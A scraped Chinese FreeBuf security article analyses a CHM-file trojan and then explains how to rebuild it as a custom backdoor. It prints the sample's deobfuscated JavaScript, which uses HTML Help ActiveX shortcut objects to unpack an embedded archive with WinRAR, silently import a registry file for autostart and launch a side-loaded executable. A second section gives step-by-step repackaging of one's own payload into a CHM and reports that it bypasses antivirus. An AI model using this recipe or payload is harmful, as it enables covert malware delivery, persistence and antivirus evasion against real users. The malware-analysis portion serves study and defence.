# CHM木马的分析与利用

---

**URL**: https://www.freebuf.com/articles/network/208897.html

**作者**: 2025-08-05 14:20:31所属地 浙江省

**发布时间**: 2025-08-05 14:20:31

**爬取时间**: 2025-08-20T17:40:34.090428

---

## 正文

官方公众号企业安全新浪微博

![图片](../images/f43141f724f98ea95118b8af321c69fe.jpg)
FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](../images/58489bc90c4e5bff5ef6e4f8a8bafaae.jpg)
FreeBuf+小程序把安全装进口袋

CHM木马的分析与利用

- 基础安全

CHM木马的分析与利用
2025-08-05 14:20:31
所属地 浙江省
![图片](../images/b9059b82f9f584c38d557848f19ae621.png)
本文由
创作，已纳入
「FreeBuf原创奖励计划」
，未授权禁止转载
*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

### 前言

CHM文件格式是微软推出的基于HTML文件特性的帮助文件系统，也称作“已编译的HTML帮助文件”。CHM能够支持脚本、Flash、图片、音频、视频等内容，并且同样支持超链接目录、索引以及全文检索功能，常用来制作说明文档、电子书等以方便查阅，在绝大多数人的印象中，CHM类型文件是“无公害”文档文件。

偶然获得了一个过X60启动的CHM木马，由于从未接触过此类木马，遂进行一番学习，并通过木马所带来的启发再创造。

### 一、木马行为分析

CHM文件是经过压缩的各类资源的集合，使用7z解压软件直接打开木马样本，如图所示，可以发现CHM文件内部包含一个说明.html文件。

打开说明.HTM文件可以发现里面存着混淆过的JS脚本代码：

进行一番解密并写下粗略的注释  PS:本人并未学过JS 所以并不懂JS 以下有任何错误请大家指出

可以看出最关键的代码应该是

```
var d = '<OBJECT id=UNRAR classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value=",C:\\Program Files\\WinRAR\\unrar.exe,e -r -y -pa123.../*- ' + c + ' C:\\Users\\Public\\Documents"><PARAM name="Item2" value="273,1,1"></OBJECT><OBJECT id=RUN classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value=",regedit.exe,/s C:\\Users\\Public\\Documents\\1.reg"><PARAM name="Item2" value="273,1,1"></OBJECT><OBJECT id=AUTO classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value=",C:\\Users\\Public\\Documents\\Perflog.exe"><PARAM name="Item2" value="273,1,1"></OBJECT>';
```

结合我之前对CHM木马的行为分析基本可以判断CHM木马的执行流程：

> 1.利用WINRAR解压自身到C:\Users\Public\Documents2.执行CMD命令注册1.reg 添加启动3.打开Perflog.exe

在WIN7虚拟机打开样本可以看到解压出了如下文件：

可以看到解压出了如图五个文件并成功添加启动项

由于我不懂逆向工程 但是可以做出如下推测

> 1.perflog.exe是具有有效签名的白文件启动时会调用edudll.dll2.edudll.dll是黑dll

以上这应该是个一个典型的白加黑木马

水平有限就不去分析这个perflog.exe的行为了

接下来思考如何打造属于自己的CHM后门

### 二、再创造

思路:

样本的JS代码基本不变，只需去掉那些无用的文件，解压缩释放出1.reg与payload即可

1.反编译样本CHM（这里使用EasyCHM）

2.修改说明.htm （由于懒 就不用做太多改动了）

3.将自己的1.reg与payload制作成压缩包

4.编译CHM

5.将压缩包并写入CHM（利用C32Asm）

将payload.rar粘贴到CHM的最后面并保存

6.测试

OK，成功。

### 三、小结

之所以这个方法能绕过杀毒检测我感觉可能是因为利用CHM文件可以绕过父进程检测

PS:我WIN7 32位虚拟机测试是可以过检测的，不知道别的环境是否可以，如果不行别喷我呀

另外此方法不用网络下载也很出彩（但是遇到没有预装winrar的系统可能就傻了）

*本文作者：strawberry，本文属 FreeBuf 原创奖励计划，未经许可禁止转载

# 木马分析
# 杀毒软件绕过
# CHM文件
![图片]
![图片](../images/b9059b82f9f584c38d557848f19ae621.png)
已在FreeBuf发表
篇文章
本文为
独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
                客服小蜜蜂（微信：freebee1024）
被以下专辑收录，发现更多精彩内容
相关推荐
![图片]
- 0文章数

